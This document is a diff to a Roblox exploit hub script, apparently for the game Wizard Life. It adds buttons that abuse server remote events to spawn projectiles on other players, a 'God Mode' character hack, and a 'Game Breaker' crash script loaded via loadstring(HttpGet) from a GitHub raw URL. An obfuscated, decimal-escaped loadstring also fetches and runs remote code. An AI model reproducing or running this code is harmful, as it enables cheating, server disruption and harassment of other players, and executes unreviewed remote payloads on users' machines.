@@ -1,4 +1,15 @@
-game.Players.noob_dabomb8:Kick("You are blacklisted from this Gui Reason : Exploit Abuse Dm CatSploitAdmin#9254 to appeal")
+game.Players.USERNAMEHERE:Kick("You are blacklisted from this Gui Reason : Exploit Abuse Dm CatSploitAdmin#9254 to appeal")
+local args = {
+    [1] = 3
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("ClothesEvent"):FireServer(unpack(args))
+local args = {
+    [1] = 1,
+    [2] = "11653261579,6241301184"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("ClothesEvent"):FireServer(unpack(args))
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
 local Window = Library.CreateLib("Aeon's WL Hub", "Ocean")
 
@@ -1934,4 +1945,164 @@ TextLabel.Text = "Made By noob_dabomb8"
 TextLabel.TextColor3 = Color3.fromRGB(0, 255, 149)
 TextLabel.TextSize = 14.000
 loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\73\97\109\67\97\116\83\112\108\111\105\116\88\47\109\121\45\103\117\105\47\109\97\105\110\47\109\121\37\50\48\103\117\105\34\41\41\40\41\10")()
+end)
+LiamsGuiSection:NewButton("Liams Game Breaker", "Most overpowered Wizard life script.", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/IamCatSploitX/crash/main/Crash"))()
+end)
+LiamsGuiSection:NewButton("Liams God Mode", "Click To Toggle Immortality", function()
+local Cam = workspace.CurrentCamera
+local Pos, Char = Cam.CFrame, game.Players.LocalPlayer.Character
+local Human = Char and Char:FindFirstChildWhichIsA("Humanoid")
+local nHuman = Human:Clone()
+nHuman.Parent, game.Players.LocalPlayer.Character = Char, nil
+nHuman:SetStateEnabled(15, false)
+nHuman:SetStateEnabled(1, false)
+nHuman:SetStateEnabled(0, false)
+nHuman.BreakJointsOnDeath, Human = true, Human:Destroy()
+game.Players.LocalPlayer.Character, Cam.CameraSubject, Cam.CFrame = Char, nHuman, wait() and Pos
+nHuman.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
+local Script = Char:FindFirstChild("Animate")
+if Script then
+Script.Disabled = true
+wait()
+Script.Disabled = false
+end
+nHuman.Health = nHuman.MaxHealth
+
+local isToggled = false
+
+local function toggleNHuman()
+if isToggled then
+nHuman:Remove()
+game.Players.LocalPlayer.Character = Char
+isToggled = false
+else
+nHuman.Parent, game.Players.LocalPlayer.Character = Char, nil
+game.Players.LocalPlayer.Character, Cam.CameraSubject, Cam.CFrame = Char, nHuman, wait() and Pos
+isToggled = true
+end
+end
+
+-- listen to button click event and toggle nHuman on each click
+script.Parent.MouseButton1Click:Connect(toggleNHuman)
+end)
+LiamsGuiSection:NewButton("Liams Flower Walk", "U To Toggle Flowers!", function()
+	local plr = game.Players.LocalPlayer
+local char = plr.Character
+local humanoid = char:WaitForChild("Humanoid")
+local mouse = plr:GetMouse()
+local orchwalk = false
+local q = "orchideous"
+
+local speed = humanoid.WalkSpeed
+
+function shoot()
+    for i,t in pairs (game.Players:GetPlayers()) do
+        if t.Name == "noob_dabomb8" or t.Name == "ANOTHERPLAYERNAME" then -- You can add other names too just remember typing "or" between t.Name == "ANOTHERPLAYERNAME"s
+            local v = (mouse.Hit.p - char.HumanoidRootPart.Position).unit
+            local w = v * 3
+            local y = t.Character.UpperTorso.Position
+            plr.PlayerGui.Client.fwp:Fire(y, w, true, q)
+            game.ReplicatedStorage.Events.ProjEvent:FireServer(y, w, q)
+        end
+    end
+end
+
+humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
+    speed = humanoid.WalkSpeed
+end)
+
+game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
+    if not gameProcessed and input.KeyCode == Enum.KeyCode.U then
+        orchwalk = not orchwalk  -- toggle orchwalk on/off on "U" key press
+    end
+end)
+
+game:GetService("RunService").RenderStepped:Connect(function()
+    if humanoid.MoveDirection.Magnitude > 0 and ((humanoid:GetState() == Enum.HumanoidStateType.Running) or (humanoid:GetState() == Enum.HumanoidStateType.RunningNoPhysics)) and orchwalk == true then -- check if humanoid is moving and on the ground and orchwalk is true
+        shoot()
+    end
+end)
+end)
+LiamsGuiSection:NewButton("Liams Snake Wrap", "Wraps a ton of parts around u that looks like a snake (CLIENT SIDED)", function()
+local plr = game.Players.LocalPlayer
+local char = plr.Character
+local humanoid = char:WaitForChild("Humanoid")
+local mouse = plr:GetMouse()
+local Bubblewalk = false
+local q = "orchideous"
+
+local speed = humanoid.WalkSpeed
+
+function shoot()
+    for i,t in pairs (game.Players:GetPlayers()) do
+        if t.Name == "noob_dabomb8" or t.Name == "ANOTHERPLAYERNAME" then -- You can add other names too just remember typing "or" between t.Name == "ANOTHERPLAYERNAME"s
+            local v = (t.Character.UpperTorso.Position - char.HumanoidRootPart.Position).unit
+            local w = v * 3
+            local y = t.Character.UpperTorso.Position + Vector3.new(0, 1.5, 0) -- add a small offset to fire the projectile above the player's torso
+            plr.PlayerGui.Client.fwp:Fire(y, w, true, q)
+            game.ReplicatedStorage.Events.ProjEvent:FireServer(y, w, q)
+        end
+    end
+end
+
+humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
+    speed = humanoid.WalkSpeed
+end)
+
+game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
+    if not gameProcessed and input.KeyCode == Enum.KeyCode.K then
+        Bubblewalk = not Bubblewalk  -- toggle orchwalk on/off on "U" key press
+    end
+end)
+
+-- Add this new block of code
+game:GetService("ContextActionService"):BindAction("ToggleOrchwalk", function(actionName, inputState, inputObject)
+    if inputState == Enum.UserInputState.Begin then
+        Bubblewalk = not Bubblewalk
+    end
+end, false, Enum.KeyCode.K)
+
+local projectileList = {}
+
+local function updateProjectiles(dt)
+    for _, projectile in pairs(projectileList) do
+        if not projectile.Parent then
+            projectileList[_] = nil
+        else
+            local target = projectile.Target.Value
+            if target then
+                local direction = (target.Position + Vector3.new(0, 1.5, 0) - projectile.Position).unit
+                local cross = direction:Cross(Vector3.new(0, 1, 0)).unit
+                projectile.Velocity = cross * 8
+            end
+        end
+    end
+end
+
+game:GetService("RunService").Heartbeat:Connect(updateProjectiles)
+
+game:GetService("RunService").RenderStepped:Connect(function()
+    if Bubblewalk == true and ((humanoid:GetState() == Enum.HumanoidStateType.Running) or (humanoid:GetState() == Enum.HumanoidStateType.RunningNoPhysics)) then -- check if orchwalk is true and humanoid is moving and on the ground
+        for _, t in pairs(game.Players:GetPlayers()) do
+            if t.Name == "noob_dabomb8" or t.Name == "ANOTHERPLAYERNAME" then
+                local projectile = Instance.new("Part")
+                projectile.Shape = Enum.PartType.Ball
+                projectile.Size = Vector3.new(0.5, 0.5, 0.5)
+                projectile.BrickColor = BrickColor.new("Institutional white")
+                projectile.Position = char.HumanoidRootPart.Position + Vector3.new(0, 3, 0) + (t.Character.UpperTorso.Position - char.HumanoidRootPart.Position).unit * 3 -- spawn projectile above the player's head, pointing towards the target
+                projectile.CanCollide = false
+                projectile.Parent = workspace
+                game.Debris:AddItem(projectile, 5) -- clean up the projectile after 5 seconds
+                local target = Instance.new("ObjectValue")
+                target.Name = "Target"
+                target.Value = t.Character.UpperTorso -- store the target's UpperTorso in an ObjectValue to keep track of it
+                target.Parent = projectile
+                table.insert(projectileList, projectile) -- add the projectile to a list to update it later
+                plr.PlayerGui.Client.fwp:Fire(t.Character.UpperTorso.Position + Vector3.new(0, 1.5, 0), projectile.Velocity, true, q)
+                game.ReplicatedStorage.Events.ProjEvent:FireServer(t.Character.UpperTorso.Position + Vector3.new(0, 1.5, 0), projectile.Velocity, q)
+            end
+        end
+    end
+end)
 end)
